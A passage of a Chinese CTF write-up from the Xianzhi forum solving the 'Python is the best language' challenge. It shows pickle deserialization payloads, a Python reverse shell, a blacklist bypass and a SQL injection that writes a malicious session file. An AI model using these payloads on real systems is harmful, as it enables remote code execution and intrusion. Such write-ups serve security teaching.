    <span class="n">unpkler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="n">REDUCE</span><span class="p">]</span> <span class="o">=</span> <span class="n">_hook_call</span><span class="p">(</span><span class="n">unpkler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="n">REDUCE</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
</pre></div>
<p>我把这部分内容分为两部分；反序列化漏洞以及基本的沙箱逃逸问题。</p>
<p>先忽略<code>unpkler.dispatch[REDUCE]</code>这一行的内容。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="n">Unpickler</span> <span class="k">as</span> <span class="n">Unpkler</span>
<span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">unpkler</span> <span class="o">=</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
    <span class="c1"># unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span>
    <span class="k">return</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
</pre></div>
<p>这里对<code>file</code>进行了反序列化，因此如果<code>file</code>可控即可造成危险。</p>
<p>用下面的脚本(exp4.py)进行序列化payload的生成：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="n">Pickler</span> <span class="k">as</span> <span class="n">Pkler</span>
<span class="kn">import</span> <span class="nn">commands</span>
<span class="k">class</span> <span class="nc">chybeta</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s2">"whoami"</span><span class="p">,))</span>    
<span class="n">evil</span> <span class="o">=</span> <span class="n">chybeta</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">pkler</span> <span class="o">=</span> <span class="n">Pkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
    <span class="n">pkler</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">evil</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"test"</span><span class="p">,</span><span class="s2">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">dump</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</pre></div>
<p>测试反序列化漏洞(exp5.py):</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="n">Unpickler</span> <span class="k">as</span> <span class="n">Unpkler</span>
<span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="nb">open</span> <span class="k">as</span> <span class="n">Open</span> 
<span class="k">def</span> <span class="nf">LOAD</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">unpkler</span> <span class="o">=</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>

<span class="k">with</span> <span class="n">Open</span><span class="p">(</span><span class="s2">"test"</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">LOAD</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</pre></div>
<p><a id="img0" href="./Python is the best language-Writeup - 先知社区_files/20180325210716-71472a80-302d-1.jpeg"><img src="./Python is the best language-Writeup - 先知社区_files/20180325210716-71472a80-302d-1.jpeg"></a></p>
<p>不过没那么简单，源码还设置了沙箱/黑名单来防止某些函数的执行，比如前面的os.system就被禁用了，我们修改exp5.py为进一步的测试：</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="nb">open</span> <span class="k">as</span> <span class="n">Open</span> 
<span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="n">Unpickler</span> <span class="k">as</span> <span class="n">Unpkler</span>
<span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="n">Pickler</span> <span class="k">as</span> <span class="n">Pkler</span>

<span class="n">black_type_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">eval</span><span class="p">,</span> <span class="nb">execfile</span><span class="p">,</span> <span class="nb">compile</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="nb">open</span><span class="p">,</span> <span class="nb">file</span><span class="p">,</span> <span class="n">popen</span><span class="p">,</span> <span class="n">popen2</span><span class="p">,</span> <span class="n">popen3</span><span class="p">,</span> <span class="n">popen4</span><span class="p">,</span> <span class="n">fdopen</span><span class="p">,</span>
                   <span class="n">tmpfile</span><span class="p">,</span> <span class="n">fchmod</span><span class="p">,</span> <span class="n">fchown</span><span class="p">,</span> <span class="n">pipe</span><span class="p">,</span> <span class="n">chdir</span><span class="p">,</span> <span class="n">fchdir</span><span class="p">,</span> <span class="n">chroot</span><span class="p">,</span> <span class="n">chmod</span><span class="p">,</span> <span class="n">chown</span><span class="p">,</span> <span class="n">link</span><span class="p">,</span>
                   <span class="n">lchown</span><span class="p">,</span> <span class="n">listdir</span><span class="p">,</span> <span class="n">lstat</span><span class="p">,</span> <span class="n">mkfifo</span><span class="p">,</span> <span class="n">mknod</span><span class="p">,</span> <span class="n">mkdir</span><span class="p">,</span> <span class="n">makedirs</span><span class="p">,</span> <span class="n">readlink</span><span class="p">,</span> <span class="n">remove</span><span class="p">,</span> <span class="n">removedirs</span><span class="p">,</span>
                   <span class="n">rename</span><span class="p">,</span> <span class="n">renames</span><span class="p">,</span> <span class="n">rmdir</span><span class="p">,</span> <span class="n">tempnam</span><span class="p">,</span> <span class="n">tmpnam</span><span class="p">,</span> <span class="n">unlink</span><span class="p">,</span> <span class="n">walk</span><span class="p">,</span> <span class="n">execl</span><span class="p">,</span> <span class="n">execle</span><span class="p">,</span> <span class="n">execlp</span><span class="p">,</span> <span class="n">execv</span><span class="p">,</span>
                   <span class="n">execve</span><span class="p">,</span> <span class="n">execvp</span><span class="p">,</span> <span class="n">execvpe</span><span class="p">,</span> <span class="nb">exit</span><span class="p">,</span> <span class="n">fork</span><span class="p">,</span> <span class="n">forkpty</span><span class="p">,</span> <span class="n">kill</span><span class="p">,</span> <span class="n">nice</span><span class="p">,</span> <span class="n">spawnl</span><span class="p">,</span> <span class="n">spawnle</span><span class="p">,</span> <span class="n">spawnlp</span><span class="p">,</span> <span class="n">spawnlpe</span><span class="p">,</span>
                   <span class="n">spawnv</span><span class="p">,</span> <span class="n">spawnve</span><span class="p">,</span> <span class="n">spawnvp</span><span class="p">,</span> <span class="n">spawnvpe</span><span class="p">,</span> <span class="n">load</span><span class="p">,</span> <span class="n">loads</span><span class="p">]</span>

<span class="k">class</span> <span class="nc">FilterException</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">(</span><span class="n">FilterException</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span>
            <span class="s1">'the callable object {value} is not allowed'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">_hook_call</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">print</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">stack</span>
        <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="n">black_type_list</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">FilterException</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
        <span class="k">return</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">wrapper</span>

<span class="k">def</span> <span class="nf">LOAD</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">unpkler</span> <span class="o">=</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
    <span class="n">unpkler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="n">REDUCE</span><span class="p">]</span> <span class="o">=</span> <span class="n">_hook_call</span><span class="p">(</span><span class="n">unpkler</span><span class="o">.</span><span class="n">dispatch</span><span class="p">[</span><span class="n">REDUCE</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>

<span class="k">with</span> <span class="n">Open</span><span class="p">(</span><span class="s2">"test"</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">LOAD</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</pre></div>
<p>此时如果简单地想通过前一步生成的test来执行系统命令，会报错。</p>
<p><a id="img1" href="./Python is the best language-Writeup - 先知社区_files/20180325210703-699fb630-302d-1.jpeg"><img src="./Python is the best language-Writeup - 先知社区_files/20180325210703-699fb630-302d-1.jpeg"></a></p>
<p>考虑其他方法。python中除了os和sys模块有提供命令执行的函数外，还有其他第三方模块，比如commands模块：</p>
<p><a id="img2" href="./Python is the best language-Writeup - 先知社区_files/20180325210611-4aa7837a-302d-1.jpeg"><img src="./Python is the best language-Writeup - 先知社区_files/20180325210611-4aa7837a-302d-1.jpeg"></a></p>
<p>因此改写生成序列化文件的exp4.py如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="n">Unpickler</span> <span class="k">as</span> <span class="n">Unpkler</span>
<span class="kn">from</span> <span class="nn">pickle</span> <span class="kn">import</span> <span class="n">Pickler</span> <span class="k">as</span> <span class="n">Pkler</span>
<span class="kn">import</span> <span class="nn">commands</span>
<span class="k">class</span> <span class="nc">chybeta</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">commands</span><span class="o">.</span><span class="n">getoutput</span><span class="p">,(</span><span class="s2">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\"</span><span class="s2">127.0.0.1</span><span class="se">\"</span><span class="s2">,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'"</span><span class="p">,))</span>    
<span class="n">evil</span> <span class="o">=</span> <span class="n">chybeta</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">pkler</span> <span class="o">=</span> <span class="n">Pkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
    <span class="n">pkler</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">evil</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"test"</span><span class="p">,</span><span class="s2">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">dump</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</pre></div>
<p>同时为了进一步利用，我们尝试反弹shell。过程如下，先运行exp4.py生成新的test序列化文件，接着nc监听本地端口，接着运行exp5.py触发序列化漏洞并完成利用</p>
<p><a id="img3" href="./Python is the best language-Writeup - 先知社区_files/20180325210651-62471a68-302d-1.jpeg"><img src="./Python is the best language-Writeup - 先知社区_files/20180325210651-62471a68-302d-1.jpeg"></a></p>
<p>不过该怎么控制源代码中的<code>load(file)</code>的file呢？通过全局搜索关键字，在<code>Mycache.py</code>的<code>FileSystemCache类</code>中有多次引用，比如定义在第137行的get方法：</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
        <span class="n">filename</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_filename</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">pickle_time</span> <span class="o">=</span> <span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">pickle_time</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">pickle_time</span> <span class="o">&gt;=</span> <span class="n">time</span><span class="p">():</span>
                    <span class="n">a</span> <span class="o">=</span> <span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
                    <span class="k">return</span> <span class="n">a</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
                    <span class="k">return</span> <span class="bp">None</span>
        <span class="k">except</span> <span class="p">(</span><span class="ne">IOError</span><span class="p">,</span> <span class="ne">OSError</span><span class="p">,</span> <span class="n">PickleError</span><span class="p">):</span>
            <span class="k">return</span> <span class="bp">None</span>
</pre></div>
<p>跟入<code>_get_filename</code>方法：</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">_get_filename</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">text_type</span><span class="p">):</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>  <span class="c1"># XXX unicode review</span>
    <span class="nb">hash</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_path</span><span class="p">,</span> <span class="nb">hash</span><span class="p">)</span>
</pre></div>
<p>可以看到将传入的字符串key进行MD5，并将其返回。不过这个<code>key</code>在哪里定义？通过全局搜索，不难发现在<code>Mysession.py</code>的<code>open_session</code>中进行了调用：</p>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">FileSystemSessionInterface</span><span class="p">(</span><span class="n">SessionInterface</span><span class="p">):</span>
    <span class="o">...</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cache_dir</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">key_prefix</span><span class="o">=</span><span class="s2">"bdwsessions"</span><span class="p">,</span>
                 <span class="n">use_signer</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">permanent</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">cache</span> <span class="o">=</span> <span class="n">FileSystemCache</span><span class="p">(</span><span class="n">cache_dir</span><span class="p">,</span> <span class="n">threshold</span><span class="o">=</span><span class="n">threshold</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">mode</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key_prefix</span> <span class="o">=</span> <span class="n">key_prefix</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">use_signer</span> <span class="o">=</span> <span class="n">use_signer</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">permanent</span> <span class="o">=</span> <span class="n">permanent</span>

    <span class="k">def</span> <span class="nf">open_session</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">app</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
        <span class="c1"># 从cookie中获取到sid</span>
        <span class="c1"># 格式 Cookie: session=675b6ec7-95bd-411f-a59d-4c3db5929604</span>
        <span class="c1"># sid 即为 675b6ec7-95bd-411f-a59d-4c3db5929604</span>
        <span class="n">sid</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">session_cookie_name</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">sid</span><span class="p">:</span>
            <span class="n">sid</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_generate_sid</span><span class="p">()</span>
            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">session_class</span><span class="p">(</span><span class="n">sid</span><span class="o">=</span><span class="n">sid</span><span class="p">,</span> <span class="n">permanent</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">permanent</span><span class="p">)</span>
        <span class="o">...</span>
        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cache</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key_prefix</span> <span class="o">+</span> <span class="n">sid</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">session_class</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">sid</span><span class="o">=</span><span class="n">sid</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">session_class</span><span class="p">(</span><span class="n">sid</span><span class="o">=</span><span class="n">sid</span><span class="p">,</span> <span class="n">permanent</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">permanent</span><span class="p">)</span>
    <span class="o">...</span>
</pre></div>
<p>其中<code>self.key_prefix</code>即为<code>bdwsessions</code>，因此假设cookie中的sesssion值为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，则<code>self.key_prefix + sid</code>即为<code>bdwsessions675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，然后这串字符串进行MD5得到的结果<code>78f634977cbacf167dfd9656fe9dd5f3</code>即为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>对应的session文件名。</p>
<p>同时根据<code>config.py</code>:</p>
<div class="highlight"><pre><span></span><span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="s2">"mysql://root:password@localhost/flask?charset=utf8"</span>
<span class="n">SESSION_FILE_DIR</span> <span class="o">=</span> <span class="s2">"/tmp/ffff"</span>
</pre></div>
<p>可以知道session文件的保存路径在<code>/tmp/ffff</code>，以及用户为root，因此具有文件导出的权限的可能性很大。</p>
<h2 id="toc-1">流程</h2>
<p>结合<code>Python is the best language 1</code>中的sql注入漏洞，我们梳理出如下的攻击流程：</p>
<ol>
<li>本地生成序列化文件，并且进行十六进制编码</li>
<li>通过sql注入漏洞outfile出session文件</li>
<li>访问index，同时带上session文件对应的session值，触发<code>open_session</code>中的<code>self.cache.get</code>，进行反序列化攻击</li>
</ol>
<p>假设前面生成的序列化文件存在于<code>/tmp/ffff/chybeta</code>，建议使用mysql的hex转码来进行十六进制的转换:</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">hex</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="s1">'/tmp/ffff/chybeta'</span><span class="p">))</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">'/tmp/ffff/exp'</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><a id="img4" href="./Python is the best language-Writeup - 先知社区_files/20180325210627-54001108-302d-1.jpeg"><img src="./Python is the best language-Writeup - 先知社区_files/20180325210627-54001108-302d-1.jpeg"></a></p>
<p>以使用<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>作为cookie为例，则其session文件存在于<code>/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3</code></p>
<p>在十六进制的序列化串前面添加<code>0x</code>，构造邮箱处的注入点：</p>
<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">id</span> <span class="k">from</span> <span class="k">user</span> <span class="k">where</span> <span class="n">email</span> <span class="o">=</span> <span class="s1">'test'</span><span class="cm">/**/</span><span class="k">union</span><span class="cm">/**/</span><span class="k">select</span><span class="cm">/**/</span><span class="mi">0</span><span class="n">x63636F6D6D616E64730A</span><span class="p">..</span><span class="cm">/**/</span><span class="k">into</span><span class="cm">/**/</span><span class="n">dumpfile</span><span class="cm">/**/</span><span class="s1">'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'</span><span class="o">#@</span><span class="n">test</span><span class="p">.</span><span class="n">com</span><span class="err">'</span>
</pre></div>
<p>也即在注册的邮箱处填入：</p>

<pre><code>test'/**/union/**/select/**/0x63636F6D6D616E64730A.../**/into/**/dumpfile/**/'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'#@test.com</code></pre>
<p>点击submit后出现<code>Please use a different email address.</code>。</p>
<p>接着在burp中抓取访问index的包，并修改cookie为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，在自己的vps上监听对应的端口：</p>
<p><a id="img5" href="./Python is the best language-Writeup - 先知社区_files/20180325210556-416f6304-302d-1.jpeg"><img src="./Python is the best language-Writeup - 先知社区_files/20180325210556-416f6304-302d-1.jpeg"></a></p>
<p>flag：</p>

<pre><code>QWB{pyth0n1s1ntere3t1ng}</code></pre>
<h1>总结</h1>
<ul>
<li>wtforms.validators的Email类验证不完善</li>
<li>flask的session处理机制</li>
<li>python沙箱逃逸</li>
<li>python反序列化漏洞</li>
<li>一点“小小”的脑洞</li>
</ul>
<h1>Refference</h1>
<ul>
<li><a href="http://bugs.leavesongs.com/PYTHON/Python%E5%BA%93WTForm%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4URLXSS%E6%BC%8F%E6%B4%9E/" target="_blank">P师傅：Python库WTForm过滤不严导致URLXSS漏洞</a></li>
</ul>
<p></p>
                
            </div>
            
            <div class="post-user-action">
                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="2216">
                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">0</span>
                </span>
                
                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="2216">
                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
                    </span>
                
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<div class="read-screen hidden"></div>
<div class="read-box hidden"></div>



    <!-- topic & appendix -->
    



<div class="row box">
    <ol class="breadcrumb">
        <li class="active">0 条回复</li>
    </ol>
    <div class="box-container post-container">
        
            <ul>
                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
            </ul>
        
    </div>
</div>


    <!-- posts of topic -->
    
        <div class="row box" id="reply-box">
            
            <div class="box-container clearfix">
                
                    <div class="reminder">
                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F2216&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
                    </div>
                
            </div>
        </div>
    
    <!-- editor for post -->
    

        </div>
        <div class="span3 pull-right offset panel-body sidebar">
            

    <div class="box">
        <div class="info-panel">
            <p><strong>先知社区</strong></p>
            <hr>
            <p class="text-center login-btn">
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F2216&amp;from_type=xianzhi" class="btn">现在登录</a>
            </p>
        </div>
    </div>

<div class="box">
    <div class="hot-node">
        <div class="info-head" style="border-bottom: 1px solid #ddd;padding: 10px;color: #999;">热门节点</div>
        <div class="info-body" style="padding: 10px">
            
                <a href="https://xianzhi.aliyun.com/forum/node/11" style="padding: 4px 10px 4px 10px;word-break: break-all;line-height: 14px;margin: 0 5px 5px 0;display: inline-block">技术文章</a>
            
        </div>
    </div>
</div>


    <div class="box">
        <div class="hot-node notice">
            <div class="info-body">
                <a href="https://xianzhi.aliyun.com/forum/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>

            </div>
        </div>
    </div>


    <div class="box sfixed" id="toc-container" style="overflow: auto; bottom: 105px; display: block;">
        <div class="panel-info">
            <div class="panel-heading">
                <h4>TOC目录</h4>
            </div>
            <div id="toc">
                <div class="high-light" style="display: block;background-color: #f3f3f3;position: absolute;"></div>
            <ol><li><a href="https://xianzhi.aliyun.com/forum/topic/2216#toc-0">分析</a></li><li><a href="https://xianzhi.aliyun.com/forum/topic/2216#toc-1">流程</a></li></ol></div>
        </div>
    </div>


        </div>
    </div>


</div>
<footer class="bs-docs-footer">
  <div class="container text-center">
      <div class="links">
          <a href="https://xianzhi.aliyun.com/forum/feed" target="_blank">RSS</a>
          <a href="https://xianzhi.aliyun.com/forum/about" target="_blank"><span>关于社区</span></a>
          <a href="https://xianzhi.aliyun.com/forum/partner" target="_blank"><span>友情链接</span></a>
          <a href="https://xianzhi.aliyun.com/forum/notice">社区小黑板</a>
      </div>
  </div>
</footer>


    <script type="text/javascript">
        $(document).ready(function () {
            voteUp = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/up/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F2216&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-up').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
            voteDown = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/down/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F2216&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-down').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
        });
    </script>


<script src="./Python is the best language-Writeup - 先知社区_files/z_stat.php" language="JavaScript"></script><script src="./Python is the best language-Writeup - 先知社区_files/core.php" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1260716569" target="_blank" title="站长统计">站长统计</a>


<script id="wappalyzer" src="chrome-extension://gppongmhjkpfnbhagpmjfkannfbllamg/js/inject.js"></script></body></html>